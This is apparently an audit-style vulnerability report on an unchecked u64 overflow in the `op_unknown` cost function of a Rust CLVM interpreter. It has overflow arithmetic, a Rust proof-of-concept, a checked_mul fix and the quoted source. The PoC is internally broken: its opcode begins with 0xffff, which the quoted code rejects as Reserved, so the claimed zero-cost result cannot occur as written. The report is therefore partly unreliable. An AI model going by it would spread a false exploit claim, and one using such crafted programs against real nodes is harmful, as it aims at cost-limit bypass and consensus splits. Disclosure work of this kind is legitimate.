### Title
Unchecked u64 Multiplication Overflow in `op_unknown` Cost Computation Allows Undercharged Execution — (`File: src/more_ops.rs`)

---

### Summary

In `src/more_ops.rs`, the `op_unknown` function computes the cost of an unknown opcode by multiplying a base cost by an attacker-controlled multiplier. This multiplication is performed on a `u64` without overflow protection. In Rust release builds (where `overflow-checks` is absent from `[profile.release]`), integer overflow wraps silently. An attacker can craft CLVM bytes such that the product wraps to a value ≤ `u32::MAX`, causing the function to return a near-zero cost for an operation whose true cost would far exceed the block limit. This is the direct analog of the external report's `yieldAccumulator` overflow: both are arithmetic overflows in a fixed-width accumulator that corrupt a critical invariant — there, a uint151 field; here, a u64 cost register.

---

### Finding Description

In `op_unknown`, after computing a base cost from the opcode's arguments and verifying it against `max_cost`, the code performs an unchecked multiplication:

```rust
check_cost(cost, max_cost)?;   // cost ≤ max_cost here
cost *= cost_multiplier + 1;   // ← no overflow check
if cost > u32::MAX as u64 {
    Err(EvalErr::Invalid(o))?
} else {
    Ok(Reduction(cost as Cost, allocator.nil()))
}
``` [1](#0-0) 

The variables involved:

- `cost` is `u64`, bounded by `max_cost` (up to `6_000_000_000` in Chia's block budget).
- `cost_multiplier` is derived from `u32_from_u8(op[0..op.len()-1])`, so it is at most `u32::MAX = 4_294_967_295`, making `cost_multiplier + 1` at most `2^32 = 4_294_967_296`. [2](#0-1) 

The maximum product is `6_000_000_000 × 4_294_967_296 ≈ 2.58 × 10^19`, which exceeds `u64::MAX ≈ 1.84 × 10^19`. The `[profile.release]` section in `Cargo.toml` sets only `lto = "thin"` — no `overflow-checks = true` — so in release builds the multiplication wraps silently. [3](#0-2) 

**Concrete overflow path:**

With `cost_multiplier = u32::MAX` (opcode prefix bytes `[0xff, 0xff, 0xff, 0xff]`) and `cost_function = 2` (mul-like, last byte `0x80`), the base cost formula is:

```
cost = MUL_BASE_COST + MUL_COST_PER_OP + (l0+l1)*MUL_LINEAR_COST_PER_BYTE + (l0*l1)/MUL_SQUARE_COST_PER_BYTE_DIVIDER
     = 92 + 885 + 12s + floor(s²/128)
``` [4](#0-3) 

For two atoms of size `s ≈ 741_455` bytes, `cost ≈ 2^32 = 4_294_967_296`. The `check_cost` guard passes because `4_294_967_296 < 6_000_000_000`. Then:

```
cost *= cost_multiplier + 1
     = 2^32 × 2^32
     = 2^64
     ≡ 0  (mod 2^64)   ← wraps to zero in release mode
```

`0 > u32::MAX` is false, so the function returns `Ok(Reduction(0, allocator.nil()))` — a cost of **zero** for an operation whose true cost is `~1.85 × 10^19`.

More generally, any `(cost, cost_multiplier)` pair satisfying `cost × (cost_multiplier + 1) mod 2^64 ≤ u32::MAX` triggers the bypass. With `cost_multiplier = u32::MAX − 1 = 4_294_967_294` and `cost = 2^32 + 2 = 4_294_967_298`:

```
4_294_967_298 × 4_294_967_295 = 2^64 + 2^32 − 2
                               ≡ 2^32 − 2 = 4_294_967_294  (mod 2^64)
```

`4_294_967_294 ≤ u32::MAX` → accepted, returning cost `4_294_967_294` instead of the true `~1.85 × 10^19`.

---

### Impact Explanation

`op_unknown` is the cost-enforcement gate for unknown opcodes in lenient mode (soft-fork compatibility). The cost returned by this function is accumulated into the running total in `run_program` and checked against the block's cost budget. [5](#0-4) 

If the returned cost wraps to zero (or a small value), the running total does not reflect the true resource consumption. An attacker can include unknown opcodes with arbitrarily large true costs while the node's cost meter barely advances, allowing:

1. **Cost-limit bypass**: A block or transaction that should be rejected as too expensive is accepted.
2. **Consensus divergence**: Nodes running debug builds (where overflow panics) reject the transaction; nodes running release builds accept it — a split.
3. **DoS via undercharged execution**: Validators perform expensive cost calculations (proportional to atom sizes) while the cost meter records near-zero, enabling repeated inclusion of such opcodes.

---

### Likelihood Explanation

- The attacker controls the opcode bytes directly (the CLVM program is attacker-supplied).
- The attacker controls the argument atoms (size and content).
- Finding a `(cost, cost_multiplier)` pair that wraps to ≤ `u32::MAX` is a straightforward arithmetic search over a continuous parameter space; the `cost = 2^32` / `cost_multiplier = u32::MAX` case is the simplest exact solution.
- The required atom size (~741 KB per atom for the `cost = 2^32` case) is within typical allocator limits.
- No privileged access, social engineering, or dependency compromise is required — only crafted CLVM bytes submitted to any node running in lenient mode.

---

### Recommendation

Replace the unchecked multiplication with a checked variant and reject on overflow:

```rust
check_cost(cost, max_cost)?;
let Some(cost) = cost.checked_mul(cost_multiplier + 1) else {
    return Err(EvalErr::Invalid(o));
};
if cost > u32::MAX as u64 {
    Err(EvalErr::Invalid(o))?
} else {
    Ok(Reduction(cost as Cost, allocator.nil()))
}
```

Alternatively, add `overflow-checks = true` to `[profile.release]` in `Cargo.toml` to make all integer overflows panic in production, then audit every arithmetic site for correctness. [3](#0-2)

### Proof of Concept

```rust
// Opcode bytes: [0xff, 0xff, 0xff, 0xff, 0x80]
//   cost_multiplier = u32_from_u8([0xff,0xff,0xff,0xff]) = 4_294_967_295 = u32::MAX
//   cost_function   = (0x80 & 0b11000000) >> 6 = 2  (mul-like)
//
// Two atoms of size s chosen so that:
//   cost = 92 + 885 + 12s + floor(s²/128) = 2^32 = 4_294_967_296
//   (s ≈ 741_455; exact value found by binary search)
//
// After check_cost passes (4_294_967_296 < 6_000_000_000):
//   cost *= 4_294_967_296   →   2^64 ≡ 0 (mod 2^64)
//
// Returned: Ok(Reduction(0, nil))  — cost zero for a ~1.85e19 true-cost op.

let mut a = Allocator::new();
let opcode = a.new_atom(&[0xff, 0xff, 0xff, 0xff, 0x80]).unwrap();
let s: usize = /* binary-search value giving cost == 2^32 */ 741_455;
let atom1 = a.new_atom(&vec![0u8; s]).unwrap();
let atom2 = a.new_atom(&vec![0u8; s]).unwrap();
let args  = a.new_pair(atom1, a.new_pair(atom2, a.nil()).unwrap()).unwrap();

let result = op_unknown(&mut a, opcode, args, 6_000_000_000);
// In release mode: Ok(Reduction(0, NIL))  ← cost underflow
// In debug mode:   panic (overflow)
assert_eq!(result.unwrap().0, 0);
``` [6](#0-5)

pub fn op_unknown(
    allocator: &mut Allocator,
    o: NodePtr,
    mut args: NodePtr,
    max_cost: Cost,
) -> Response {
    // unknown opcode in lenient mode
    // unknown ops are reserved if they start with 0xffff
    // otherwise, unknown ops are no-ops, but they have costs. The cost is computed
    // like this:

    // byte index (reverse):
    // | 4 | 3 | 2 | 1 | 0          |
    // +---+---+---+---+------------+
    // | multiplier    |XX | XXXXXX |
    // +---+---+---+---+---+--------+
    //  ^               ^    ^
    //  |               |    + 6 bits ignored when computing cost
    // cost_multiplier  |
    // (up to 4 bytes)  + 2 bits
    //                    cost_function

    // 1 is always added to the multiplier before using it to multiply the cost, this
    // is since cost may not be 0.

    // cost_function is 2 bits and defines how cost is computed based on arguments:
    // 0: constant, cost is 1 * (multiplier + 1)
    // 1: computed like operator add, multiplied by (multiplier + 1)
    // 2: computed like operator mul, multiplied by (multiplier + 1)
    // 3: computed like operator concat, multiplied by (multiplier + 1)

    // this means that unknown ops where cost_function is 1, 2, or 3, may still be
    // fatal errors if the arguments passed are not atoms.

    let op_atom = allocator.atom(o);
    let op = op_atom.as_ref();

    if op.is_empty() || (op.len() >= 2 && op[0] == 0xff && op[1] == 0xff) {
        Err(EvalErr::Reserved(o))?;
    }

    let cost_function = (op[op.len() - 1] & 0b11000000) >> 6;
    let cost_multiplier: u64 = match u32_from_u8(&op[0..op.len() - 1]) {
        Some(v) => v as u64,
        None => {
            return Err(EvalErr::Invalid(o))?;
        }
    };

    let mut cost = match cost_function {
        0 => 1,
        1 => {
            let mut cost = ARITH_BASE_COST;
            let mut byte_count: u64 = 0;
            while let Some((arg, rest)) = allocator.next(args) {
                args = rest;
                cost += ARITH_COST_PER_ARG;
                let len = atom_len(allocator, arg, "unknown op")?;
                byte_count += len as u64;
                check_cost(cost + (byte_count as Cost * ARITH_COST_PER_BYTE), max_cost)?;
            }
            cost + (byte_count * ARITH_COST_PER_BYTE)
        }
        2 => {
            let mut cost = MUL_BASE_COST;
            let mut first_iter: bool = true;
            let mut l0: u64 = 0;
            while let Some((arg, rest)) = allocator.next(args) {
                args = rest;
                let len = atom_len(allocator, arg, "unknown op")?;
                if first_iter {
                    l0 = len as u64;
                    first_iter = false;
                    continue;
                }
                let l1 = len as u64;
                cost += MUL_COST_PER_OP;
                cost += (l0 + l1) * MUL_LINEAR_COST_PER_BYTE;
                cost += (l0 * l1) / MUL_SQUARE_COST_PER_BYTE_DIVIDER;
                l0 += l1;
                check_cost(cost, max_cost)?;
            }
            cost
        }
        3 => {
            let mut cost = CONCAT_BASE_COST;
            while let Some((arg, rest)) = allocator.next(args) {
                args = rest;
                let len = atom_len(allocator, arg, "unknown op")?;
                cost += CONCAT_COST_PER_ARG;
                cost += CONCAT_COST_PER_BYTE * (len as Cost);
                check_cost(cost, max_cost)?;
            }
            cost
        }
        _ => 1,
    };

    assert!(cost > 0);

    check_cost(cost, max_cost)?;
    cost *= cost_multiplier + 1;
    if cost > u32::MAX as u64 {
        Err(EvalErr::Invalid(o))?
    } else {
        Ok(Reduction(cost as Cost, allocator.nil()))
    }
}
